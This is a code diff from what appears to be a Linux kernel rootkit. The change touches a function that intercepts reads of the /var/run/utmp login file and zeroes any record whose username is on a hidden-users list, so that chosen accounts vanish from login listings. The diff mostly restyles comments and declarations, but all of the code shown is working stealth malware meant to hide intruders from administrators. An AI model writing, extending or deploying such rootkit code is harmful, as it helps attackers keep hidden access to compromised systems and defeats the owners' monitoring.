@@ -4,8 +4,10 @@
 #include "../../utils.h"
 #include "../../config.h"
 
-/* The following macros and structures are from the utmp.h userspace header.
- * Each entry of /var/run/utmp is a structure of type struct utmp */
+/*
+    The following macros and structures are from the utmp.h userspace header.
+    Each entry of the /var/run/utmp file is a structure of type struct utmp.
+*/
 #define EMPTY         0
 #define RUN_LVL       1
 #define BOOT_TIME     2
@@ -47,8 +49,6 @@ struct utmp {
     char __unused[20];
 };
 
-
-// Determines whether the user should be hidden or not, by username
 static bool rooti_should_hide_user(char *username)
 {
     for (int i = 0; i < ROOTI_HIDDEN_USERS_COUNT; i++) {
@@ -59,37 +59,33 @@ static bool rooti_should_hide_user(char *username)
     return false;
 }
 
-/*
-    Rigs the record returned from the utmp file, hiding the record if the user should be hidden.
-    This is achieved by copying the results into kernel space, filling the buffer with zeros and
-    returning the rigged results back into user space.
-*/
 int rooti_hide_login_entry(char *user_buf, size_t count)
 {
-    // Allocate a kernel buffer to store the data returned to user
-    char *kernel_buf = kmalloc(count, GFP_KERNEL);
+    char *kernel_buf;
+    struct utmp *utmp_buf;
+    int ret;
+
+    kernel_buf = kmalloc(count, GFP_KERNEL);
     if (kernel_buf == NULL) {
         ROOTI_DEBUG("failed to allocate memory");
         return -ENOMEM;
     }
+    utmp_buf = (struct utmp *)kernel_buf;
 
-    // Copy the results into our kernel buffer
-    int err = copy_from_user(kernel_buf, user_buf, count);
-    if (err > 0) {
-        ROOTI_DEBUG("copy_from_user() failed: %d", err);
+    ret = copy_from_user(kernel_buf, user_buf, count);
+    if (ret > 0) {
+        ROOTI_DEBUG("copy_from_user() failed: %d", ret);
         kfree(kernel_buf);
         return -EFAULT;
     }
 
-    // Check if the username contained the in the record is of a user that should be hidden
-    struct utmp *utmp_buf = (struct utmp *)kernel_buf;
     if (rooti_should_hide_user(utmp_buf->ut_user)) {
-        // Match found, fill the buffer with zeros, marking it as invalid
+        // Filling the buffer with zeros should do the trick
         memset(kernel_buf, 0, count);
-        // Copy the results back to user space
-        err = copy_to_user(user_buf, kernel_buf, count);
-        if (err > 0) {
-            ROOTI_DEBUG("copy_to_user() failed: %d", err);
+
+        ret = copy_to_user(user_buf, kernel_buf, count);
+        if (ret > 0) {
+            ROOTI_DEBUG("copy_to_user() failed: %d", ret);
             kfree(kernel_buf);
             return -EFAULT;
         }
